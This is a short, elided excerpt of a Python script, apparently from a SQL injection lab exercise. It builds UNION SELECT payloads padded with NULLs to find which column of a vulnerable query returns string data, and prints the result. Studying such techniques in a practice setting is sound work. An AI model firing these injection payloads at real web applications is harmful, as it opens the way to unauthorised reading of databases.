...
def sqli_string_col(url, num_col):
	...
	for i in range(0, num_col):
		num_null = ["NULL"] * num_col
		num_null[i] = "'text02'"
		payload = f"' UNION SELECT " + ','.join(num_null) + "--"
...
if __name__ == "__main__":
	...
	try:
		...
		string_col = sqli_string_col(url, num_col)
		if string_col:
			print(f'\033[32m[+] The column {string_col} is of type string\033[0m')
